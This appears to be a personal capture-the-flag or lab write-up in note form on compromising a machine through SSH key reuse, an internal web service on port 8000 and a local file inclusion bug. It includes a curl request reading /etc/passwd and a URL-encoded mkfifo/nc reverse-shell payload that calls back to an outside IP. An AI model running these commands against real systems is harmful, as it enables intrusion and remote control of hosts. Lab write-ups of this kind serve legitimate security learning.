# same creds

tried same ssh_keys for this as well for anita and it worked

checked everything but nothing worked then I have seen **internal services**!

![[Pasted image 20240605193144.png]]

now I can see 8000 port

### 8000

checked every files and folders with anita like /opt /tmp /var

`/crash` & `/tmp` got my attention inside /var

![[Pasted image 20240605194356.png]]

There was already test.php available so my first thought it **LFI**!

### LFI

confirmed with curl
```
curl http://240.0.0.1:8000/../../../../../etc/passwd
```

now try to access webpage at `../var/crash/test.php`
it was just cmd shell

#### Two paths

1. utilize what's given to me with test.php&cmd=ls
2. upload my shell and get revshell

```
http://240.0.0.1:8000/backend/?view=../../../../../../var/crash/test.php&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.222%204444%20%3E%2Ftmp%2Ff
```

![[Pasted image 20240605194824.png]]

uploaded my `shell.php` pentest monkey

### priv esc

got www-data shell

user can run everything as root!
